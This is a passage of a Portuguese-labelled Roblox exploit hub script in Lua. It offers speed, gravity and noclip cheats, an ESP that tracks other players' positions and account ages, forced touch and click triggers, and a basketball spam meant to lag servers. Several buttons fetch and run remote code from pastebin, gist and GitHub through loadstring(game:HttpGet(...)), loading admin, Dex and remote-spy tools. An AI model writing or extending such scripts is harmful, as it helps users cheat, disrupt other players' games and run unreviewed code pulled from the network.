        end
    end
})

local Tab6 = Window:MakeTab({Name = "Misc", Icon = "rbxassetid://10709782230"})

local Paragraph = Tab6:AddParagraph({"Misc", "Funções Avançadas"})

local Section = Tab6:AddSection({"<Settings Player-"})

Tab6:AddSlider({
   Name = "Velocidade",
   Increase = 1,
   MinValue = 16,
   MaxValue = 888,
   Default = 16,
   Callback = function(Value)
       local player = game.Players.LocalPlayer
       local character = player.Character or player.CharacterAdded:Wait()
       local humanoid = character:FindFirstChildOfClass("Humanoid")
       
       if humanoid then
           humanoid.WalkSpeed = Value
       end
   end
})

Tab6:AddSlider({
   Name = "Altura do Salto",
   Increase = 1,
   MinValue = 50,
   MaxValue = 500,
   Default = 50,
   Callback = function(Value)
       local player = game.Players.LocalPlayer
       local character = player.Character or player.CharacterAdded:Wait()
       local humanoid = character:FindFirstChildOfClass("Humanoid")
       
       if humanoid then
           humanoid.JumpPower = Value
       end
   end
})

Tab6:AddSlider({
   Name = "Gravidade",
   Increase = 1,
   MinValue = 0,
   MaxValue = 10000,
   Default = 196.2,
   Callback = function(Value)
       game.Workspace.Gravity = Value
   end
})

local InfiniteJumpEnabled = false

game:GetService("UserInputService").JumpRequest:Connect(function()
   if InfiniteJumpEnabled then
      local character = game.Players.LocalPlayer.Character
      if character and character:FindFirstChild("Humanoid") then
         character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
      end
   end
end)

Tab6:AddToggle({
   Name = "Infinite Jump",
   Default = false,
   Callback = function(Value)
      InfiniteJumpEnabled = Value
   end
})

local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local Plr = Players.LocalPlayer
local Clipon = false

Tab6:AddToggle({
    Name = "Noclip",
    Default = false,
    Callback = function(Value)
        if Value then
            Clipon = true

            local Stepped
            Stepped = game:GetService("RunService").Stepped:Connect(function()
                if Clipon then
                    for a, b in pairs(Workspace:GetChildren()) do
                        if b.Name == Plr.Name then
                            for i, v in pairs(Workspace[Plr.Name]:GetChildren()) do
                                if v:IsA("BasePart") then
                                    v.CanCollide = false
                                end
                            end
                        end
                    end
                else
                    Stepped:Disconnect()
                end
            end)
        else
            Clipon = false
        end
    end
})

local Section = Tab6:AddSection({"<Outros-"})

Tab6:AddButton({
  Name = "FE DOORS",
  Callback = function()
    loadstring(game:HttpGet('https://pastebin.com/raw/W1hjUfhx'))()
  end
})

local isActive = false

Tab6:AddToggle({
    Name = "Loop Smoke Avatar",
    Default = false,
    Callback = function(Value)
        isActive = Value

        while isActive do
            local mall = workspace:WaitForChild("WorkspaceCom"):WaitForChild("001_Mall"):WaitForChild("001_Pizza"):FindFirstChild("CatchFire")
            
            if mall then
                local touchInterest = mall:FindFirstChild("TouchInterest")
                if touchInterest then
                    firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, mall, 0)
                    wait()
                    firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, mall, 1)
                end
            end
            wait(1)
        end
    end
})

local isActive = false

Tab6:AddToggle({
    Name = "Loop Fire Avatar",
    Default = false,
    Callback = function(Value)
        isActive = Value

        while isActive do
            local playerName = game.Players.LocalPlayer.Name
            -- Acessando o caminho com :WaitForChild() para evitar problemas com o nome "001_Lots"
            local lotFolder = game:GetService("Workspace"):WaitForChild("001_Lots")
            local house = lotFolder:FindFirstChild(playerName .. "House")

            if house then
                local mall = house:WaitForChild("HousePickedByPlayer"):WaitForChild("HouseModel"):WaitForChild("001_BBQ"):FindFirstChild("CatchFire")
                if mall then
                    local touchInterest = mall:FindFirstChild("TouchInterest")
                    if touchInterest then
                        firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, mall, 0)
                        wait()
                        firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, mall, 1)
                    end
                end
            else
                warn("House not found for player: " .. playerName)
            end
            wait(1)
        end
    end
})

local Section = Tab6:AddSection({"<Boombox-"})

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = game:GetService("Players").LocalPlayer

local selectedAudioId = "5546573724" -- ID inicial padrão

-- Dropdown para selecionar o ID do áudio
local Dropdown = Tab6:AddDropdown({
    Name = "Copiar ID De Áudio",
    Options = {"5546573724", "2738830850", "6343741731", "8880765497", "9114038441", "146563959", "165970126", "1571087469", "9067330158", "4810729995", "4910368846", "6512108316"},
    Default = "5546573724",
    MultiSelect = false,
    Callback = function(Value)
        selectedAudioId = Value
        -- Copia o ID selecionado para a área de transferência
        setclipboard(selectedAudioId)
    end
})

Tab6:AddButton({
  Name = "Boombox New All",
  Callback = function()
    loadstring(game:HttpGet("https://gist.githubusercontent.com/Shnmaxscripts357/7c8bf36c4ec07ded031162022a4c0d67/raw/4c2e79d2228d6a131ae880a1844412968087597d/%25C3%2581udio%2520All"))()
  end
})

Button = Tab6:AddButton({
    Name = "Get Trail",
    Callback = function()
        local Player = game.Players.LocalPlayer
        local Character = Player.Character
        local Humanoid = Character:FindFirstChildOfClass("Humanoid")
        local RootPart = Character:FindFirstChild("HumanoidRootPart")
        local OldPos = RootPart.CFrame
        
        -- Função para manter o humanoide parado
        local function freezeHumanoid(humanoid)
            humanoid.WalkSpeed = 0
            humanoid.JumpPower = 0
        end
        
        -- Função para restaurar a mobilidade do humanoide
        local function restoreHumanoid(humanoid)
            humanoid.WalkSpeed = 16 -- Valor padrão de WalkSpeed
            humanoid.JumpPower = 50 -- Valor padrão de JumpPower
        end
        
        -- Primeira coordenada para teleportar
        local firstPosition = CFrame.new(-349, 5, 98)
        
        -- Referência ao objeto PoolClick dentro de 001_Hospital
        local PoolClick = workspace.WorkspaceCom["001_Hospital"]:FindFirstChild("PoolClick")
        
        if PoolClick and PoolClick:FindFirstChild("ClickDetector") then
            -- Congelar o humanoide
            freezeHumanoid(Humanoid)
            
            -- Teleportar o jogador para a coordenada inicial (-349, 5, 98)
            RootPart.CFrame = firstPosition
            
            -- Esperar um momento antes do próximo teleporte
            task.wait(1) -- Pequena pausa de 1 segundo
            
            -- Teleportar o jogador para o objeto PoolClick
            RootPart.CFrame = PoolClick.CFrame
            
            -- Acionar o ClickDetector
            fireclickdetector(PoolClick.ClickDetector)
            
            -- Esperar 2 segundos antes de retornar o jogador
            task.wait(2)
            
            -- Teleportar o jogador de volta para a posição original
            RootPart.CFrame = OldPos
            
            -- Restaurar a mobilidade do humanoide
            restoreHumanoid(Humanoid)
        else
            warn("PoolClick ou ClickDetector não encontrado!")
        end
    end
})

local Section = Tab6:AddSection({"<Lag Basketball-"})

local BNumber = 1000 -- Valor padrão inicial

Toggle = Tab6:AddToggle({
    Name = "Spam Basketball",
    Default = false,
    Callback = function(Value)
        BasketToggleH = Value
        if BasketToggleH then
            local Player = game.Players.LocalPlayer
            local Backpack = Player.Backpack
            local Mouse = Player:GetMouse()
            local Character = Player.Character
            local Humanoid = Character:FindFirstChildOfClass("Humanoid")
            local RootPart = Character:FindFirstChild("HumanoidRootPart")
            local OldPos = RootPart.CFrame
            local Clone = Workspace.WorkspaceCom["001_GiveTools"].Basketball

            for i = 1, BNumber do
                task.wait()
                RootPart.CFrame = Clone.CFrame
                fireclickdetector(Clone.ClickDetector)
            end
            task.wait()
            RootPart.CFrame = OldPos

            while BasketToggleH do
                task.wait()
                for i, v in ipairs(Character:GetChildren()) do
                    if v.Name == "Basketball" then
                        task.wait()
                        local args = {
                            [1] = Mouse.Hit.p
                        }
                        v.ClickEvent:FireServer(unpack(args))
                    end
                end
            end
        end
    end
})

local Slider = Tab6:AddSlider({
    Name = "Quantidade De Basketball",
    MinValue = 1,
    MaxValue = 1000, -- Ajuste conforme necessário
    Default = BNumber,
    Increase = 1,
    Callback = function(Value)
        BNumber = Value
    end
})

local Tab7 = Window:MakeTab({Name = "Esp", Icon = "rbxassetid://10709776240"})

local Paragraph = Tab7:AddParagraph({"Esp", "Localização Inteligente IA"})

-- Variáveis principais
local ESPEnabled = false
local CurrentColor = Color3.fromRGB(255, 255, 255) -- Cor inicial branca
local RainbowEnabled = false

local function createESP(player)
    if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
        return
    end

    -- Adicionar Highlight para destacar o jogador
    local highlight = Instance.new("Highlight")
    highlight.Name = "ESP_Highlight"
    highlight.Adornee = player.Character
    highlight.FillColor = CurrentColor
    highlight.FillTransparency = 0.5
    highlight.OutlineColor = Color3.fromRGB(0, 0, 0)
    highlight.OutlineTransparency = 0
    highlight.Parent = player.Character

    -- Criar BillboardGui para exibir as informações
    local billboard = Instance.new("BillboardGui")
    billboard.Name = "ESP_Info"
    billboard.Adornee = player.Character:FindFirstChild("HumanoidRootPart")
    billboard.Size = UDim2.new(0, 150, 0, 80)
    billboard.StudsOffset = Vector3.new(0, 3, 0)
    billboard.AlwaysOnTop = true
    billboard.Parent = player.Character

    -- Nome do jogador
    local nameLabel = Instance.new("TextLabel")
    nameLabel.Size = UDim2.new(1, 0, 0.3, 0)
    nameLabel.BackgroundTransparency = 1
    nameLabel.Text = player.Name
    nameLabel.TextColor3 = CurrentColor
    nameLabel.TextStrokeTransparency = 0
    nameLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    nameLabel.TextScaled = true
    nameLabel.Font = Enum.Font.SourceSans
    nameLabel.Parent = billboard

    -- Distância
    local distanceLabel = Instance.new("TextLabel")
    distanceLabel.Size = UDim2.new(1, 0, 0.3, 0)
    distanceLabel.Position = UDim2.new(0, 0, 0.3, 0)
    distanceLabel.BackgroundTransparency = 1
    distanceLabel.Text = "Distância: Calculando..."
    distanceLabel.TextColor3 = CurrentColor
    distanceLabel.TextStrokeTransparency = 0
    distanceLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    distanceLabel.TextScaled = true
    distanceLabel.Font = Enum.Font.SourceSans
    distanceLabel.Parent = billboard

    -- Idade da conta
    local ageLabel = Instance.new("TextLabel")
    ageLabel.Size = UDim2.new(1, 0, 0.3, 0)
    ageLabel.Position = UDim2.new(0, 0, 0.6, 0)
    ageLabel.BackgroundTransparency = 1
    ageLabel.Text = "Idade da conta: " .. player.AccountAge .. " dias"
    ageLabel.TextColor3 = CurrentColor
    ageLabel.TextStrokeTransparency = 0
    ageLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    ageLabel.TextScaled = true
    ageLabel.Font = Enum.Font.SourceSans
    ageLabel.Parent = billboard

    -- Atualizar distância continuamente
    task.spawn(function()
        while ESPEnabled and player.Character and player.Character:FindFirstChild("HumanoidRootPart") do
            local distance = (player.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
            distanceLabel.Text = string.format("Distância: %.2f", distance)

            -- Atualizar cor dinamicamente
            highlight.FillColor = CurrentColor
            nameLabel.TextColor3 = CurrentColor
            distanceLabel.TextColor3 = CurrentColor
            ageLabel.TextColor3 = CurrentColor

            task.wait(0.1)
        end
    end)
end

local function toggleESP(enabled)
    ESPEnabled = enabled
    if ESPEnabled then
        for _, player in pairs(game.Players:GetPlayers()) do
            if player ~= game.Players.LocalPlayer and not player.Character:FindFirstChild("ESP_Info") then
                createESP(player)
            end
        end

        game.Players.PlayerAdded:Connect(function(player)
            if ESPEnabled then
                player.CharacterAdded:Connect(function()
                    createESP(player)
                end)
            end
        end)

        game.Players.PlayerRemoving:Connect(function(player)
            if player.Character and player.Character:FindFirstChild("ESP_Info") then
                player.Character.ESP_Info:Destroy()
                if player.Character:FindFirstChild("ESP_Highlight") then
                    player.Character.ESP_Highlight:Destroy()
                end
            end
        end)
    else
        for _, player in pairs(game.Players:GetPlayers()) do
            if player.Character then
                if player.Character:FindFirstChild("ESP_Info") then
                    player.Character.ESP_Info:Destroy()
                end
                if player.Character:FindFirstChild("ESP_Highlight") then
                    player.Character.ESP_Highlight:Destroy()
                end
            end
        end
    end
end

local function setESPColor(color)
    CurrentColor = color
    RainbowEnabled = false -- Desativar Rainbow ao selecionar uma cor
end

local function enableRainbow()
    RainbowEnabled = true
    task.spawn(function()
        while RainbowEnabled do
            local time = tick() * 5
            CurrentColor = Color3.fromHSV((time % 360) / 360, 1, 1)
            task.wait(0.1)
        end
    end)
end

-- Toggle para ativar/desativar ESP
Tab7:AddToggle({
    Name = "ESP",
    Default = false, -- Inicialmente desativado
    Callback = function(Value)
        toggleESP(Value)
    end
})

-- Dropdown para seleção de cor
Tab7:AddDropdown({
    Name = "Cores do ESP",
    Options = {"Azul", "Vermelho", "Verde", "Amarelo", "Roxo", "Cinza", "Preto", "Branco", "Laranja", "Rosa", "Marrom", "Rainbow"},
    Default = {"Branco"},
    Callback = function(selected)
        if selected == "Azul" then
            setESPColor(Color3.fromRGB(0, 0, 255))
        elseif selected == "Vermelho" then
            setESPColor(Color3.fromRGB(255, 0, 0))
        elseif selected == "Verde" then
            setESPColor(Color3.fromRGB(0, 255, 0))
        elseif selected == "Amarelo" then
            setESPColor(Color3.fromRGB(255, 255, 0))
        elseif selected == "Roxo" then
            setESPColor(Color3.fromRGB(128, 0, 128))
        elseif selected == "Cinza" then
            setESPColor(Color3.fromRGB(128, 128, 128))
        elseif selected == "Preto" then
            setESPColor(Color3.fromRGB(0, 0, 0))
        elseif selected == "Branco" then
            setESPColor(Color3.fromRGB(255, 255, 255))
        elseif selected == "Laranja" then
            setESPColor(Color3.fromRGB(255, 165, 0))
        elseif selected == "Rosa" then
            setESPColor(Color3.fromRGB(255, 192, 203))
        elseif selected == "Marrom" then
            setESPColor(Color3.fromRGB(139, 69, 19))
        elseif selected == "Rainbow" then
            enableRainbow()
        end
    end
})

local P40 = Window:MakeTab({
    Name = "Scripts",
    Icon = "rbxassetid://10709782230" -- Defina um ícone, se necessário
})

local Paragraph = P40:AddParagraph({"Scripts", "Ferramentas."})

P40:AddButton({
  Name = "Infinite Yield Admin",
  Callback = function()
    loadstring(game:HttpGet('https://pastebin.com/raw/EUHHShLn'))()
  end
})

P40:AddButton({
  Name = "Shaders Reborn",
  Callback = function()
    loadstring(game:HttpGet(('https://pastefy.app/xXkUxA0P/raw'),true))()
  end
})

P40:AddButton({
  Name = "Simple Spy Mobile",
  Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/realredz/SimpleSpy/refs/heads/main/Mobile.lua"))()
  end
})

P40:AddButton({
  Name = "Shaders Do Shnmaxhub",
  Callback = function()
    local a = game.Lighting
a.Ambient = Color3.fromRGB(33, 33, 33)
a.Brightness = 3.0
a.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
a.ColorShift_Top = Color3.fromRGB(255, 247, 237)
a.EnvironmentDiffuseScale = 0.105
a.EnvironmentSpecularScale = 0.522
a.GlobalShadows = true
a.OutdoorAmbient = Color3.fromRGB(51, 54, 67)
a.ShadowSoftness = 0.18
a.GeographicLatitude = -15.525
a.ExposureCompensation = 0.5

-- Criando e configurando o efeito Bloom
local b = Instance.new("BloomEffect", a)
b.Enabled = true
b.Intensity = 0.5
b.Size = 9999
b.Threshold = 0

-- Ajustando o efeito ColorCorrection
local c = Instance.new("ColorCorrectionEffect", a)
c.Brightness = 0.015
c.Contrast = 0.25
c.Enabled = true
c.Saturation = 0.2
c.TintColor = Color3.fromRGB(217, 145, 57)

-- Configuração de modo
if getgenv().mode == "Summer" then
    c.TintColor = Color3.fromRGB(255, 220, 148)
elseif getgenv().mode == "Autumn" then
    c.TintColor = Color3.fromRGB(217, 145, 57)
else
    warn("No mode selected!")
    b:Destroy()
    c:Destroy()
end

-- Efeito de profundidade de campo
local d = Instance.new("DepthOfFieldEffect", a)
d.Enabled = true
d.FarIntensity = 0.077
d.FocusDistance = 21.54
d.InFocusRadius = 20.77
d.NearIntensity = 0.277

-- Efeito SunRays
local s = Instance.new("SunRaysEffect", a)
s.Enabled = true
s.Intensity = 0.005
s.Spread = 0.146

-- Configuração do céu
local sky = game.Lighting:FindFirstChild("Sky")
if not sky then
    sky = Instance.new("Sky")
    sky.SkyboxBk = "http://www.roblox.com/asset/?id=144933338"
    sky.SkyboxDn = "http://www.roblox.com/asset/?id=144931530"
    sky.SkyboxFt = "http://www.roblox.com/asset/?id=144933262"
    sky.SkyboxLf = "http://www.roblox.com/asset/?id=144933244"
    sky.SkyboxRt = "http://www.roblox.com/asset/?id=144933299"
    sky.SkyboxUp = "http://www.roblox.com/asset/?id=144931564"
    sky.Parent = game.Lighting
end

-- Função para verificar se uma cor é "verde"
local function isGreenish(color)
    return color.G > color.R * 1.2 and color.G > color.B * 1.2
end

-- Função para alterar o material das partes
local function updatePartMaterial(part)
    if part:IsA("BasePart") then
        if isGreenish(part.Color) then
            part.Material = Enum.Material.Grass
        else
            part.Material = Enum.Material.Concrete
        end
    end
end

-- Atualizar materiais para partes existentes
for _, part in ipairs(workspace:GetDescendants()) do
    updatePartMaterial(part)
end

-- Monitorar novas partes e aplicar o material automaticamente
workspace.DescendantAdded:Connect(function(part)
    updatePartMaterial(part)
end)

print("RTX Graphics and Grass Material system loaded!")
  end
})

P40:AddButton({
  Name = "Dex Explorer Dark",
  Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))()
  end
})

P40:AddButton({
  Name = "Ant Lag",
  Callback = function()
    loadstring(game:HttpGet('https://pastebin.com/raw/fQrMu5Cv'))()
  end
})

local Credits = Window:MakeTab({
    Name = "Créditos",
    Icon = "rbxassetid://10709781717" -- Defina um ícone, se necessário
})

-- Adicionando um rótulo para informar o criador do projeto
TextLabel = Credits:AddLabel({"", "🔧 Criador: Shelby"})  

-- Adicionando um rótulo para listar os ajudantes do projeto
TextLabel = Credits:AddLabel({"", "🤝 Ajudantes: Lucca, Matheus, Fragiota, XXXTENTACION, Rael, Fr"})  

-- Adicionando um rótulo para indicar a versão atual do projeto
TextLabel = Credits:AddLabel({"", "📅 Última Versão: 20.2"})  

-- Adicionando um rótulo para informar a versão da atualização pendente
TextLabel = Credits:AddLabel({"", "🚧 Atualização Pendente: 22.0"})  

-- Adicionando informações sobre a versão 20.2 e melhorias do Hub
TextLabel = Credits:AddLabel({"", "🎉 Nova Versão: 20.2 – Reorganização do Hub!"})  
TextLabel = Credits:AddLabel({"", "⚡ Funções Melhoradas: Todos os sistemas foram otimizados para maior desempenho e estabilidade."})  
TextLabel = Credits:AddLabel({"", "🔧 Novas Funcionalidades: Agora o Hub inclui sistemas de segurança aprimorados, mais ferramentas administrativas e personalizações de interface."})  
TextLabel = Credits:AddLabel({"", "💡 Melhorias no Sistema: Cada função foi refinada para garantir maior fluidez e usabilidade."})  
TextLabel = Credits:AddLabel({"", "🚀 Novas Ferramentas: O Hub agora oferece novas opções de administração, como controle de visibilidade e gerenciador de segurança."})  

-- Novas atualizações
TextLabel = Credits:AddLabel({"", "🏝️ Novas Ilhas Criadas: Uma reorganização foi feita com novas funcionalidades."})
TextLabel = Credits:AddLabel({"", "🌀 Poder Kamui Melhorado: O poder Kamui foi ajustado para maior desempenho."})

-- Atualização de Segurança
TextLabel = Credits:AddLabel({"", "🔧 Segurança: Em Manutenção. Melhorias contínuas em andamento."})

-- Adicionando um aviso sobre o uso do Hub
TextLabel = Credits:AddLabel({"", "⚠️ Aviso: Uso do Hub é estritamente para administração."})  
TextLabel = Credits:AddLabel({"", "🛑 Deve ser usado com cautela e responsabilidade."})  

-- Adicionando um aviso sobre os ajudantes
TextLabel = Credits:AddLabel({"", "👥 Ajudantes continuam ativos e são cruciais para o sucesso."})  

-- Adicionando um aviso sobre a segurança
TextLabel = Credits:AddLabel({"", "🔒 Segurança: Pequenas invasões detectadas no Open Source."})  
TextLabel = Credits:AddLabel({"", "🚨 Estamos intensificando os esforços para reforçar a segurança."})

game.Workspace.FallenPartsDestroyHeight = -math.huge
